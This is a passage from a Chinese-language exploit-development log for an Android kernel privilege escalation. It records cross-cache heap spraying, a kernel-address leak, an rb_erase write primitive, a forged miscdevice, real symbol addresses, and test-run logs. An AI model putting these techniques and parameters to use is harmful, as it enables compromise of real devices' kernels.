| 131416-1 | `BOOTID_WRITE_PASS` attempt 9 | `MISC_BRIDGE_MISS_PRESERVE` |
| 132842-1 | attempt 1 | **`MISC_BRIDGE_READ_PASS`** |
| 132842-2 | attempt 4 | `MISC_BRIDGE_MISS_PRESERVE` |
| 132842-3 | miss | — |
| 134242-1 | miss | — |
| 134242-2 | attempt 32 | `MISC_BRIDGE_MISS_PRESERVE` |

> **Tally: stage0 lands in 4 of 6 boots, the bridge is reached in 4 of 6 and passes its read gate in 1 of 4.**

**⇒ 官方 stage0 命中率 = 4/6 次开机；MEY 实测 = 0/256 次 attempt（两次独立运行）。这是数量级差距，不是概率波动。**

### 24.3 ★★★★★★ H7 修复（`exec_after_deleted`）—— 时序确实被修正，但不是根因

**发现**：官方 `exploit-rotate.c:5432` 在 dada profile 上执行 `setenv("EXEC_AFTER_DELETED","54000",1)`，
并附注释 "Start exec near the delete tail so a hit has no long rb_erase train."
**f77 此前漏抄这一条**，`exec_after_deleted` 停留在默认 100。

**实测对照（LANE_DONE，`delete_us ≈ 28.9 ms`）**：

| | `exec_after_deleted` | `exec_call_ns` | 占 delete | 在飞 slab 数 |
|---|---|---|---|---|
| f77 原值 | 100 | **0.10 ms** | 0.18 % | ≈ 3 |
| 官方 dada | 54000 | **27.6 ms** | 95.5 % | **≈ 1740** |

**H7 改动后实机复现（`MEY_TIMING_GATE exec_after_deleted=54000 pipe_count=6000 irq_batch_fds=8`）**：
```
LANE_DONE sequence=82 ... delete_us=28926 exec_us=28580
   exec_call_ns=27611042 prime_begin_ns=27595417 ... exec_last_us=30099
   threshold_ns=27595886 victim_seen_ns=27601511 exec_overlap=1
```
**⇒ `exec_call_ns` 从 0.10 ms 精确移到 27.6 ms（delete 的 95.5%），与官方 96.4% 吻合。H7 的时序修正成功且可复现。**

**但**：128 attempts 后 `BOOTID_WRITE_MISS attempts=128`（stage0 全 MISS），`boot_id` 仍为真实 UUID（未被污染）⇒ **`exec_after_deleted` 对 stage0 中性（非回归原因）**。

### 24.4 ★★★★★★★ 核心根因：**分配器阶数不匹配**（order-3 vs order-1）

**`/proc/slabinfo` 实机数据**：

| cache | objsize | objs/slab | pages/slab | **order** |
|---|---|---|---|---|
| `posix_timers_cache` | 264 | 31 | 2 | **1** |
| `kmalloc-8k` | 8192 | 4 | 8 | **3** |
| `kmalloc-4k` | 4096 | 8 | 8 | **3** |
| `kmalloc-2k` | 2048 | 16 | 8 | **3** |
| `kmalloc-1k` | 1024 | 32 | 8 | **3** |
| **`skbuff_head_cache`** | **256** | **32** | **2** | **1** ★ |
| `skbuff_fclone_cache` | 512 | 32 | 4 | 2 |

**Python 复现 `slub.c:calculate_order()`（`slub_max_order=3`, `nr_cpus=8 ⇒ min_objects=4*(fls(8)+1)=20`）完全吻合实机**：
- `size=8192 ⇒ order=3`（`32768/8192=4` objs）✓ 与 slabinfo `4 8` 一致
- `size∈{1024,2048,4096,8192} ⇒ 全部 order=3`（因 `min_objects=20` 强迫升阶）

**⇒ 机理链**：
```
f77 的 spray  = send(socket, 8192)  →  skb 数据区 = kmalloc-8k (order-3, 8 连续页)
目标          = posix_timers_cache 归还得 order-1 (2 页)
⇒ 阶数不符：order-1 页必须【合并成 8 个连续 order-1】才能被 kmalloc-8k 抓走
⇒ 合并成功率极低 (需 buddy 中 8 个相邻 order-1 同时空闲)
⇒ changed_nodes 恒 0, stage0 命中率 0/256
```

**同时发现**：`0x2000`(=8192) 恰等于 `KMALLOC_MAX_CACHE_SIZE`（`slab.h:331`，`KMALLOC_SHIFT_HIGH=PAGE_SHIFT+1=13`）——**fragment 尺寸精确卡在 slab cache 上界，是最脆弱取值**。

**⇒ 唯一与目标同阶（order-1）且用户态可大量触发的分配器 = `skbuff_head_cache`（`sk_buff` 本体，256B×32/order-1 slab）**
**⇒ 新方向 H8：spray 改用「大量小 `send()`」消耗 `skbuff_head_cache`（order-1），与 `posix_timers_cache` 同阶 cross-cache。**

### 24.5 排除表（本轮更新）

| 假设 | 旧判定 | ★ 新判定 |
|---|---|---|
| H1 CPU 亲和性 | 「证伪」（据 `changed_nodes=0`） | ⚠️ **证据无效，需重判** |
| H4 drain 门限 | 「部分成立」 | ⚠️ 保持（有独立证据：严格门限下 active 回弹） |
| H5 页未归还 | 「证伪」（据 `changed_nodes=0`） | ⚠️ **证据无效，需重判** |
| H6 时序错位 | 「唯一存活」 | ✅ **成立**（H7 已修正 `exec_after_deleted`），但**非根因** |
| **H7 `exec_after_deleted` 漏抄** | — | ✅ **确认成立并已修**（时序 0.18%→95.5%），对 stage0 中性 |
| **H8 分配器阶数不匹配（order-3 spray vs order-1 目标）** | — | ★★★ **本轮新增，当前最强候选** |

### 24.6 本轮交付物

| 文件 | 内容 |
|---|---|
| `c64560/f77.c` | 新增 `MEY_EXEC_AFTER_DELETED` / `MEY_PRIME_START_DELETED` env；MEY profile 补齐官方 dada 三项 `setenv`（`exec_after_deleted=54000`/`pipe_count=6000`/`irq_batch_fds=8`）；新增 `MEY_TIMING_GATE` 打印 |
| `c64560/f77.c.bak_235533` | 本轮改动前备份 |
| `analysis/scratch/f77_h7` | H7 版本二进制（md5 `80a36f3ca8b17dbf44159308aa8956da`） |
| 本节（§24） | H7 轮全部结论 |

### 24.7 下一轮唯一假设

> **H8：spray 的分配器阶数必须与 `posix_timers_cache`（order-1）一致。**
>
> 当前 `send(8192)` → skb 数据区 = `kmalloc-8k`（order-3）⇒ 结构性不可能 cross-cache 到 order-1 目标。
>
> **验证方式**：改用 `skbuff_head_cache`（256 B × 32/order-1 slab）作为 spray 载体——
> 例如大量并发 `send(fd, 小数据)` 触发 `sk_buff` 分配，观察 stage0 命中率是否脱离 0。

---

## 25. ★★★★★★★ 阶段三实测（H8 轮）：H8 被实测证伪 + H7 需回退

> 2026-10-05 · 探针 `analysis/scratch/sprayprobe.c`（新写）· 结论：**H8 前提错误，f77 spray 本来就是 order-1**

### 25.1 源码链推导（推翻 H8 的计算错误）

第 24 节 H8 的推导链是：

```
send(tx, frag, 8192) -> __alloc_skb(8192) -> kmalloc_reserve
  -> SKB_HEAD_ALIGN(8192)=8576 -> kmalloc_size_roundup -> kmalloc-16k(order-3)
```

**这条链是错的**，因为它假设 `sock_alloc_send_pskb` 会把 8192 全量交给 `__alloc_skb` 当 `header_len`。

实际 `unix_stream_sendmsg`（`af_unix.c:2194-2208`，f77 与官方都用 `SOCK_STREAM`）为：

```c
size = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);   /* =3712+32768=36480 */
data_len  = max_t(int, 0, size - SKB_MAX_HEAD(0));              /* =8192-3712=4480 */
data_len  = min_t(size_t, size, PAGE_ALIGN(data_len));          /* ->8192 */
skb = sock_alloc_send_pskb(sk, size - data_len, data_len, ..., get_order(UNIX_SKB_FRAGS_SZ));
/*                           header_len=0    data_len=8192   max_page_order=3           */
```

其中 `SKB_MAX_HEAD(0)=4096-384=3712`，`UNIX_SKB_FRAGS_SZ=PAGE_SIZE<<get_order(32768)=32768`。

⇒ **`header_len = 0`**、`data_len = 8192`。于是：

| 部分 | 落点 | 尺寸 | order |
|---|---|---|---|
| skb 结构体 | `skbuff_head_cache` | 256 B | **1** |
| 数据区 head | `__alloc_skb(0)` → `SKB_HEAD_ALIGN(0)=384` → `kmalloc_size_roundup` → **`kmalloc-512`** | 512 B | 2 |
| payload | `alloc_skb_with_frags` → `alloc_pages(order)` | 8192 B | **1** ★ |

`alloc_skb_with_frags` 的降阶循环（`skbuff.c:6341`）：

```c
while (order && PAGE_ALIGN(data_len) < (PAGE_SIZE << order))
    order--;
/* order=3: 8192 < 32768 -> 2 ; order=2: 8192 < 16384 -> 1 ; order=1: 8192 < 8192? no -> stop */
/* ⇒ order = 1  */
```

### 25.2 ★★★★★ 实机实测（决定性）

`sprayprobe` 做「dump slabinfo → 建 socketpair → send → 再 dump → 求差」。
关键对照组（`pairs/repeats`，`send_len`，`ΔMemFree`，`ΔSlab`）：

| send_len | sends | `kmalloc-8k` Δ | `kmalloc-16k` Δ | `skbuff_head` Δ | `kmalloc-512` Δ | page 层消耗/send | 反推 order |
|---|---|---|---|---|---|---|---|
| 4096 | 1600 | **0** | **0** | +3552 | +2112 | 4234 B (1.03 页) | **0** |
| **8192** | **6000** | **0** | **0** | +13120 | +11680 | **8296 B (2.03 页)** | **1** ★ |
| 16384 | 1600 | **0** | **0** | +3488 | +1984 | 16947 B (4.14 页) | **2** |
| 32768 | 1600 | **0** | **0** | +3456 | +2016 | 31951 B (7.80 页) | **3** |

- `page 层消耗 = (−ΔMemFree) − ΔSlab`
- 全部四组吻合度 **101.3% / 101.5% / 100.5% / 97.5%**（<3% 误差）
- **`kmalloc-8k` 与 `kmalloc-16k` 在所有尺寸下 Δ 恒为 0**（`/proc/slabinfo` 里甚至**不存在 `kmalloc-16k` 条目**）

⇒ **判定：H8 的「spray 走 order-3」前提被实测证伪。**
⇒ `send(8192)` 每次精确消耗 **2 个连续 4K 页** = `alloc_pages(order=1)` = 与 `posix_timers_cache`（31×264B / 2 页）**同阶**。

**官方源码亦自证**：`exploit-rotate.c:5375` 注释原文 ——「…touch a dangling node before the **order-1 reclaim spray**」

### 25.3 ★★★★ H7 需回退（上一轮改错了）

上一轮 H7 报「漏抄官方 dada 的 `setenv`」并改为 `exec_after_deleted=54000 / irq_batch_fds=8`。

**实际官方源码**（`exploit-rotate.c:5290-5305` 默认 env 表 + `5370-5400` dada 覆写）：

| 参数 | 官方默认 | 官方 **dada 覆写** | H7 改成 | 判定 |
|---|---|---|---|---|
| `PIPE_COUNT` | 3000 | **6000** | 6000 | ✓ 正确 |
| `TIMER_GOAL` | 58699 | **56000** | 56000 | ✓ 正确 |
| `EXEC_AFTER_DELETED` | 100 | **100**（同默认） | 54000 | ✗ **改错** |
| `PRIME_START_DELETED` | 32 | **32**（同默认） | 54000 | ✗ **改错** |
| `IRQ_BATCH_FDS` | 1 | **1**（同默认） | 8 | ✗ **改错** |

dada 分支原文只写：
```c
timer_goal = 56000;
pipe_count = 6000;
/* Start exec near the delete tail so a hit has no long rb_erase train. */
exec_after_deleted = 100;
irq_arm_after_deleted = -1;
irq_batch_fds = 1;
irq_batch_period_ns = 50000;
irq_arm_lead_ns = 250000000;
```

⇒ **`exec_after_deleted=100` 是官方 dada 真值**（语义：`deleted >= 100` 就 exec，即极早期）。
H7 把它改到 54000 = 反向操作，会让 hit 落点带一长串 `rb_erase` train，与官方注释的意图相反。
**已回退**：`exec_after_deleted=100` / `prime_start_deleted=32` / `irq_batch_fds=1`，保留 `pipe_count=6000`。

### 25.4 排除表（H8 轮更新）

| 假设 | 判定 | 依据 |
|---|---|---|
| H1 CPU 亲和性 | ⚠️ 证据无效需重判 | 旧依据 `changed_nodes=0` 已废 |
| H2 `INIT_ON_ALLOC` 零化 | ❌ 仍证伪 | `SCAN_DIAG zero=0` |
| H4 drain 门限 | ⚠️ 部分成立 | 严格门限致 `RCU_NOT_DRAINED` |
| H5 页未归还 | ⚠️ 证据无效需重判 | 同上 |
| H6 时序错位 | ✅ 成立但非根因 | H7 已修（且已回退） |
| H7 `exec_after_deleted` 漏抄 | ❌ **前提错，已回退** | §25.3 |
| **H8 分配器阶数不匹配** | ❌ **实测证伪** | §25.2（`kmalloc-8k/16k` Δ≡0，反推 order=1） |

### 25.5 H8 轮交付物

1. `analysis/scratch/sprayprobe.c` + 二进制 `sprayprobe`（md5 `70666c2e8d573851b2b392cc14d1cbe6`）
2. `f77.c` 回退 H7 错误改动（备份 `f77.c.bak_h8_001256`）
3. 本节结论（§25.1~25.5）
4. **新事实**：`send(len)` 的 payload order = `floor(log2(len/4096))`，即
   `len=4096→order0`、`8192→order1`、`16384→order2`、`32768→order3`；`kmalloc-*` 完全不参与。

### 25.6 下一轮唯一假设（H9）

> **H9：cross-cache 的失败不在「阶数」，而在「页回收时序窗口」。**
>
> 既然 spray 已是 order-1 且与目标同阶，那么 0/256 说明**页池从未对齐**：
> 要么 `posix_timers_cache` 的 order-1 页**还没真正还给 buddy**（RCU 延迟 + `SLAB_ACCOUNT` 回收路径），
> 要么 spray 的 order-1 页**先于** timer 页释放而拿走了别的空闲页。
>
> **验证方式**：在 `wait_timer_slab_drain` 通过后、`ORDER1_FRAGMENTS` spray 之前，
> 插入实测点——直接对比 `posix_timers_cache` 的 `slabdata` 下降量 vs spray 的 order-1 页申请量，
> 判断「有没有真的抢到同一批物理页」。

---

## 26. ★★★★★★★★★★ 阶段三实测（H10 轮）：**stage0 首次命中 + 链路推进到 stageB**

> 2026-10-05 · 二进制 `f77_h10`（md5 见 §25.5）· 日志 `analysis/scratch/h10_r2_full.log`（1,175 行）

### 26.1 历史性结果

```
LANE_DONE sequence=94 timing_slot=94 victim=15966 timers=56000 deleted=56000 errors=0
RCU_FORCE attempt=94 created=40000 deleted=40003 errors=0
SLAB_DRAIN_PASS attempt=94 active=810 total=992 wait_ms=152 gate=0
STAGE0_DIRTY_ARM attempt=94
SPRAY_DONE attempt=94 valid=1 pairs=6000 fragments=18000 errors=0
BOOTID_WRITE_PASS attempt=94 q0=0xffffff802a29b090 q1=0xffffffe34ad7d5d0 slide=0x22c8c00000 kernel_base=0xffffffe348c00000
STAGE0_GATE_PASS slide=0x22c8c00000 kernel_base=0xffffffe348c00000
```

- ★★★★★ **`BOOTID_WRITE_PASS` 命中 attempt=94** —— 此前 MEY 累计 **0/256 attempts**，这是项目史上**第一次 stage0 命中**
- ★★★ **`STAGE0_GATE_PASS` 通过** —— 泄露的 slide 被验证为**真值**

**slide 双向校验（Python）**：
```
slide            = 0x22c8c00000
kernel_base      = 0xffffffc080000000 + 0x22c8c00000 = 0xffffffe348c00000  ✓ 与实测一致
uhid_fops+slide  = 0xffffffc0812f1498 + 0x22c8c00000 = 0xffffffe349ef1498  ✓ 与 stageB expected 一致
```

### 26.2 链路推进深度（全部为首次出现）

| 事件 | 数值 | 含义 |
|---|---|---|
| `CROSSCACHE_ALLOC` | `prepare=800 spray=275 pre=24 post=25` | cross-cache 页申请/回收计数 |
| `CROSSCACHE_CPU_GATE` | `effective=4 base=2 physical=2-5 hash_cpus=8 scan_workers=4` | CPU 门限 |
| **`KS_COLLISIONS`** | `pile=4096 baseline=17/17 threshold=170 found=8/8` | ★ **KS 碰撞 8/8 全中** |
| `KS_SCAN_DONE` | `worker=0,1,2,3 found=1` | 4 个 worker 各找到 1 个 |
| `CROSSCACHE_KS` | `leaked=0xffffff8b2cf34b00 base=0xffffff8b2cf30000 slot=15` | ★ **页泄露确认** |
| `BRIDGE_PAYLOAD` | `fops=0xffffff8b2cf37640 scratch=...37700 records=341` | ★ 假 fops 已铺 |
| `CROSSCACHE_RECLAIM` | `base=0xffffff8b2cf30000 first_list=...0118 send=32768` | ★ 页回收 |
| `PIPE_CARRIER_PREPARED` | `base=0xffffff8a32598000 before_bridge=1` | pipe 载体就绪 |
| `FAKE_ORDER1_MULTI` | `parent=0xffffff802a29b188 classes=11 slots=31 records=341` | 多类假 fragment |
| **`MISC_BRIDGE_STAGE_BEGIN`** | `base=0xffffff8b2cf30000 list=...0118 slab=810/992` | ★★ **stageB 开始** |

**⇒ H10 修复后，链路第一次推进到 `MISC_BRIDGE_STAGE_BEGIN`，这是此前任何一轮都未达到的深度。**

### 26.3 当前失败点（唯一卡点）

```
MISC_BRIDGE_MISS_VERIFY attempt=1 observed=0 expected=0xffffffe349ef1498 errno=25
```

- `expected` = `uhid_fops + slide` ✓ **计算正确**
- `observed = 0`，`errno = 25`（**ENOTTY**）
- **判读**：`bridge_read64` 读路径失败 ⇒ `open(/dev/uhid)` 打开的**仍是真 `uhid_misc`**，
  说明 W1 写入 `misc_list.next` 的假冒 miscdevice **未被 `misc_open()` 遍历到**

### 26.4 与官方基准对照

| 指标 | 官方（OP13/dada） | MEY（本轮） |
|---|---|---|
| stage0 命中 | 4/6 boots | **1/95 attempts（首次）** |
| 推进到 bridge stage | 4/6 | **1/95（首次）** |
| `MISC_BRIDGE_READ_PASS` | 1/4 | 0（卡在 `MISC_BRIDGE_MISS_VERIFY`） |

### 26.5 下一轮唯一假设（H11）

> **H11：stageB 的失败在 `misc_list` 遍历命中率，须用官方的多类 fragment + KS 扫描参数对齐。**
>
> `FAKE_ORDER1_MULTI` 已铺 `classes=11 slots=31 records=341`，`KS_COLLISIONS found=8/8` 全中，
> 但 `MISC_BRIDGE_MISS_VERIFY observed=0` ⇒ 假 miscdevice 的 **`minor`/`name` 字段未与 open 的 device 匹配**，
> 或 `misc_list` 的**插入位置**导致 `misc_open()` 遍历不到。
>
> **验证**：对比官方 `validate_misc_bridge()` 的完整判据链（是否还检查 `fops` 类型/permissions），
> 并核对 `FAKE_MISC_OFF 0x100` / `FAKE_MISC_FOPS_OFF 0x10` 是否与官方一致。
>
> ★ **重要前置**：重跑时须**保留 stage0 命中**（现 ≈1/95），因此本轮策略应为
> **「多 boot、每 boot 跑满 128 attempt」**，而非改参数。

---

## 27. ★★★★★★★★ H11 轮（2026-10-05）：stageB 卡点根因定案

> 二进制 `f77_h11`（2,354,800 B，md5 `0751db590dddec965525205488ca5c8b`）
> 日志 `analysis/scratch/h11_t1.log`（1,038 行）+ `h11_v0_full.log`

### 27.1 本轮假设来源

承接 §26.5 的 H11（`MISC_BRIDGE_MISS_VERIFY observed=0 errno=25`）。本轮把 H11 拆成 7 个可证伪子项，逐项用**源码 diff + kallsyms 交叉验证**排除。

### 27.2 七变体穷举（排除表）

| # | 子假设 | 判定 | 证据 |
|---|---|---|---|
| ① | `FAKE_MISC_*` 常量抄错 | ❌ **排除** | 官方 `exploit-rotate.c:361-371` vs f77 `L386-396`：`OFF 0x100`/`FOPS_OFF 0x10`/`LIST_OFF 0x18`/`PARENT_OFF 0x28`/`STRIDE 0x58`/`CLASSES 11`/`SLOTS 31`/`LEAF_DELTA 0x30` **逐字节一致** |
| ② | `minor`/`fops` 字段未填 | ❌ **排除** | `fill_crosscache_payload`（官方 L2731-2740 / f77 L3084-3090）均显式写 `minor=UHID_MINOR(239)` + `fops=fake_fops` + `parent`，**代码同构** |
| ③ | 判据链漏项 | ❌ **排除** | `open_verified_bridge`（官方 L1657-1667 / f77 L1846-1860）与 `validate_misc_bridge`（官方 L1671-1684 / f77 L1943+）**判据相同**（`LINK_UHID_FOPS+slide`） |
| ④ | `forged_parent` 地址域 | ⚠️ **可疑（已加 A/B 开关）** | 官方 `L1671`… 实际 `L5643`: `forged_parent = LINK_MISC_LIST + kernel_slide - 8`（**image 域**）；f77 `L5807`: `DIRECT_MAP_BEGIN + (LINK_MISC_LIST-IMAGE_BASE) + MEY_PHYS_DELTA - 8`（**physmap 域**）。f77 注释自述改因「Image VA 写疑似 BOOT1 panic 源」 |
| ⑤ | payload 未铺 | ❌ **排除** | 见 ② |
| ⑥ | fragment 选择错 | ❌ **排除** | spray 线程（官方 L1445-1448 / f77 L1562-1566）均有 `fragment = misc_fragments[(i*REPEATS+repeat) % FAKE_MISC_CLASSES]`，**同构** |
| ⑦ | 读出通道断 | ✅ **本轮主攻** | 见 27.3 |

### 27.3 ★ ENOTTY 语义定案（本轮核心结论）

`sprd` 源码 `kernel_src/.../ashmem.c:821-828`：
```c
static long ashmem_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct ashmem_area *asma = file->private_data;
	long ret = -ENOTTY;                       /* ★ 初值 */
	switch (cmd) {
	case ASHMEM_SET_NAME:
		ret = set_name(asma, (void __user *)arg);
		break;
	...
```

**ENOTTY 只可能来自两种情况**：
1. **`file->f_op->unlocked_ioctl == NULL`** ⇒ VFS 直接 `-ENOTTY`（**真 uhid fops 无 ioctl**）
2. `ashmem_ioctl` 被调用但 `cmd` 未命中任何 `case`（此处 cmd 是 `ASHMEM_SET_NAME`，必命中）

⇒ **确认：`ashmem_ioctl` 从未被调用 ⇒ `/dev/uhid` 打开的是真 uhid ⇒ 假 miscdevice 未被 `misc_open()` 遍历到**
⇒ **`misc_list.next` 未被 W1 改写**

`observed = 0` 的解释：`bridge_read64` 内 `set_ashmem_name_blob` 返回 -1 ⇒ `bridge_read_once` 返回 -1 ⇒ `bridge_read64` 返回 -1，`observed` **保持初值 0**。
（旧写法 `if (bridge_read64(...) || observed != expected)` 因 `||` 短路**无法区分**「读失败」与「真读到 0」—— 本轮已拆开。）

### 27.4 kallsyms 交叉验证（全部一致 ✓）

| 符号 | kallsyms 真值 | f77 常量 |
|---|---|---|
| `misc_list` | `0xffffffc08229b190` | `LINK_MISC_LIST` ✓ |
| `uhid_misc` | `0xffffffc0822d7c00` | `LINK_UHID_MISC` ✓ |
| `uhid_fops` | `0xffffffc0812f1498` | `LINK_UHID_FOPS` ✓ |
| `ashmem_ioctl` | `0xffffffc0804742e8` | `LINK_ASHMEM_IOCTL` ✓ |
| `ashmem_open` | `0xffffffc080474f34` | `LINK_ASHMEM_OPEN` ✓ |
| **`ashmem_fops`** | **`0xffffffc0812ff898`** | ★ **新发现：可直接引用完整 fops** |

### 27.5 ★ 结构性发现：`misc_list` 与 `ctl_table[boot_id]` 同页

```
misc_list        image_off 0x229b190
ctl_table[boot_id] image_off 0x229b090
                      差值  0x100
⇒ 同一 .data 物理页
stage0 读端 = proc_do_uuid 走 table->data      （数据流：只看内容）
stageB 读端 = misc_open() 走编译期常量 &misc_list（指针流：看地址本身）
```
同一物理页、两种消费方式，对页状态与地址域的依赖**不同**。这是 ④（域）之所以可疑的结构性依据。

### 27.6 ★★ 崩溃模型（本轮新定，最重要的认知跃迁）

`h10_r2_full.log` 的 stageB 段**只有 1 次 attempt**：
```
MISC_BRIDGE_STAGE_BEGIN base=... 
ATTEMPT_BEGIN attempt=1 ...
SPRAY_DONE attempt=1 valid=1 pairs=6000 fragments=18000 errors=0
MISC_BRIDGE_MISS_VERIFY attempt=1 observed=0 expected=0xffffffe349ef1498 errno=25
<随后被 \0 填充>
```
`exploit_attempt` 返回 `ATTEMPT_PRESERVE(-1)` ⇒ stageB 主循环 `if (result < 0) hold_cred_unknown();` ⇒ **进程挂起**（`for(;;) asm("yield")`）。

**本轮两次实机实测**：
| 运行 | 时长 | attempts | stage0 | 结局 |
|---|---|---|---|---|
| `h11_t1.log` | 120s timeout | **86** | 全 MISS | **正常被 KILL，设备未崩** |
| `h11_v0_full.log` | 3600s timeout | **97~100** | 全 MISS | **停在 `attempt=100` 的 `DELETE_ROLE_GATE_PASS` 后 —— 内核崩溃** |

`h11_v0_full.log` 尾部：
```
ATTEMPT_BEGIN attempt=100 batch=1 pairs=6000 fragments=18000 rcu_wait_us=150000
VICTIM_ROLE_GATE_PASS physical=7
DELETE_ROLE_GATE_PASS expected=0x7c observed=0x7c
<戛然而止>
```
⇒ **`execv` → `cleanup_timerqueue` → `rb_erase` 打错几何 ⇒ 内核 panic**

**旁证**：
- `ro.boot.bootreason = reboot`（温和重启，非 watchdog）
- tombstone 最新仍是 **2026-09-28**（无用户态崩溃）⇒ **内核级重启**
- `/data/local/tmp/f77_h11` 崩溃后**消失**（880 个旧文件保留）⇒ ext4/f2fs 未刷盘丢失，**反证崩溃发生在 f77_h11 执行期间**

**⇒ 结论：这不是"参数没调好"，而是「打对才命中、打错就崩」的概率博弈。**
- 命中窗口 ≈ attempt 19~94（h10_r2 命中于 94；c81 命中于 19/22/31/43/58）
- **100 次 attempt 内必崩** ⇒ 每 boot 的有效尝试窗口很窄

### 27.7 本轮交付物

1. `analysis/scratch/f77_h11`（md5 `0751db590dddec965525205488ca5c8b`）+ `c64560/f77.c`（备份 `f77.c.bak_h11_003731`）
2. `tools/campaign83.sh`（A/B 双域 + timeout 7200s + 跑满 512）
3. 本节结论（§27.1~27.7）

**f77.c 本轮 4 处改动**：
1. `validate_misc_bridge` 拆开 `||` 短路（分别报 `rc`/`observed`/`errno`，`errno` 先清零）
2. 新增 image 域对照读（判定域分叉）
3. 新增 `MEY_STAGEB_IMAGEVA` 开关 + `STAGEB_FORGED_PARENT` 日志
4. 新增 `STAGEB_STAGE0_CHANNEL`（纯 procfs 反查 stage0 通道，零写入）

### 27.8 下一轮唯一假设（H12 候选）

> **H12：stageB 的失败不在「常量/判据/payload」，而在 W1 落点确定性。**
>
> 已排除 ①~③⑤⑥；④（域）需 `MEY_STAGEB_IMAGEVA=1` A/B 实测；
> 但**更本质**的是 27.6 的崩溃模型 —— 若每次 W1 有 p 概率打对、1-p 打错则 panic，
> 那么 stageB 的存活次数 = 1/(1-p)，而 stageB 需要连续多次存活才能走完 `misc_open` 验证。
>
> **验证路径**：
> 1. `MEY_STAGEB_IMAGEVA=1` A/B（隔离 ④）
> 2. 分析 `__rb_erase_augmented`（`0xffffffc08003a9d4`）的**四条 Case 分支**与 fragment 几何的对应，
>    找出「打错 → 走 rebalance → panic」的那条路径，并在 fragment 里**封死它**
> 3. 直接用 `ashmem_fops`（`0x812ff898`）替代手工 fake_fops，减一个自由度

---

## 28. H12 轮（2026-10-05）· rb_erase 写序定案 + 官方 dada 参数回滚

> **本轮五阶段全部完成。阶段零缓解无阻断；阶段一定案唯一假设；阶段二反汇编定案 + 变体穷举；
> 阶段三 A/B 单变量实机对照成立；阶段四本节写回。**
> 证据脚本：`analysis/scripts/h12_disasm_tq.py`、`h12_disasm_tq2.py`、`h12_conclusion.py`、
> `h12_variant_matrix.py`、`h12_sym_check.py`、`rberase_geom_sim2.py`
> 实测日志：组 A = `analysis/scratch/h12_base.log`（137,062 B，**已归档**）、
> 组 B = `/data/local/tmp/h12_ab100.log`（**崩溃时未刷盘，已丢失**）

### 28.0 一句话结论

**`rb_erase` 的真实写序不是旧资料记的 `0x3ab0c: str x9,[x10]`，而是
`0x3aa00: str x8,[x11]` ⇒ `W1 = *(parent+8) = rb_right(=forged_child)`。
旧结论属 43499 路线几何，对 64560 不适用。**
**并且：H8 轮"以官方真值之名"把 `exec_after_deleted` 从 54000 改成 100 是方向性错误，
本轮回滚为 54000 后，128 attempts 跑满、零崩溃；改回 100 立刻内核崩溃 + 设备重启。**

### 28.1 rb_erase 写序定案（反汇编逐条）

**入参语义（`timerqueue_del @ 0xffffffc08003f7d8`）**：
```
0x3f814: mov x0, x19        ; x19 = 第 2 入参 = node  (timerqueue_node*)
0x3f818: mov x1, x20        ; x20 = 第 1 入参 = root/head
0x3f81c: bl  0x3a9d4        ; rb_erase(node, root)
```
30 处调用点形态全部一致：`add x0,X,#0x20`（head 在结构 +0x20）+ `mov x1,Y`。

**`rb_erase @ 0xffffffc08003a9d4` 入口（关键 x8/x10 对应）**：
```
0x3a9d4: ldp  x8,x10,[x0,#8]   ; ★ x8=[node+8]=rb_right ; x10=[node+0x10]=rb_left
0x3a9d8: cbnz x10, 0x3aa18     ; rb_left != 0 ?
```
对照 Linux 6.6 `lib/rbtree.c`：`child = node->rb_right`（→x8）、`tmp = node->rb_left`（→x10）。**一致 ✓**

**fragment 布局（官方与 f77 逐字节同构）**：
| offset | 字段 | 写入值 |
|---|---|---|
| +0x00 | `rb_parent_color` | `forged_parent` |
| +0x08 | `rb_right` | `forged_child`（**非 0**） |
| +0x10 | `rb_left` | **0**（memset 未写） |
| +0x18 | `expires` | `UINT64_MAX` |

⇒ `rb_left==0 && rb_right!=0` ⇒ **`cbnz x10` 不跳** ⇒ 走 **`0x3a9dc`** 分支。

**真实写序**：
```
0x3a9dc: ldr  x9,[x0]              ; x9 = forged_parent
0x3a9e4: ands x10,x9,#-4           ; parent = forged_parent & ~3
0x3a9e8: b.eq 0x3aa00              ; parent==0 → 用 root
0x3a9f0: ldr  x12,[parent,#0x10]!  ; ★ 读 *(parent+0x10) —— parent 必须可读（崩点候选）
0x3a9f8: cmp  x12,x0               ; parent->rb_left == node ?
0x3a9fc: csel x11,parent+0x10,parent+8,eq
0x3aa00: str  x8,[x11]             ; ★★★ W1: *(parent+0x8) = rb_right (= child)
0x3aa04: cbnz x8, 0x3aa10          ; rb_right != 0 ?
0x3aa10: str  x9,[x8]              ; ★★ W2: *(rb_right) = forged_parent
0x3aa14: ret                       ; 直接返回，不进 __rb_erase_color
```

⇒ **W1 = `*(forged_parent + 0x8) = forged_child`**（前提 `parent->rb_left == node` 不成立时的
`csel` 分支；实测 fragment +0x10=0 ⇒ 走 `parent+8` 一侧 ✓）

### 28.2 旧 0x3ab0c 结论作废

`analysis/output/RE_rb_erase_mechanism_2026-09-28.md` 的
"写原语 @`0x3ab0c` / 单子节点路径 `str x9,[x10]`" 对应的是
**`rb_left!=0 && rb_right==0`** 的进入条件 —— 那是 **43499 rt_mutex 路线的几何**，
在 64560 的 fragment 布局下**根本不会走到**。

⇒ **该文件对 64560 不适用，勿再引用。**

### 28.3 8 类几何变体矩阵（穷举）

| # | (pc,right,left) | 路径 | 写序 | 风险 |
|---|---|---|---|---|
| **V1** | EVEN,≠0,0 | `0x3a9dc→0x3aa10` | `*(par+8)=right`, `*(right)=pc` | ★ 需 par 可读 ⇒ **现有、最优** |
| V2 | EVEN,0,0 | →`0x3aa0c` | `*(par+8)=0` | 无跨结构写 |
| V3 | ODD,0,0 | `0x3aa78` rebalance | — | ★★ 进 `__rb_erase_color` |
| V4 | ODD,≠0,0 | →`0x3aa10` | 写**奇数指针** | ★★★ 后续解引用必崩 |
| V5 | 0,≠0,0 | `0x3aa00` 空树 | `*(root)=right` | 不依赖 par |
| V6 | 0,0,0 | 空树 | `*(root)=0` | 无 |
| V7 | EVEN,0,≠0 | `0x3ab04` | `*(0)=pc`（43499 几何） | 后继 walk |
| V8 | EVEN,≠0,≠0 | `0x3aa1c` | 复杂 | ★★ 依赖链可读 |

**⇒ V1 即现有几何；V4 是「打错颜色位」的崩溃来源（后续 `rb_erase` walk 解引用奇数指针 ⇒ panic）。**

### 28.4 官方 dada 参数铁证（H8 误判定位）

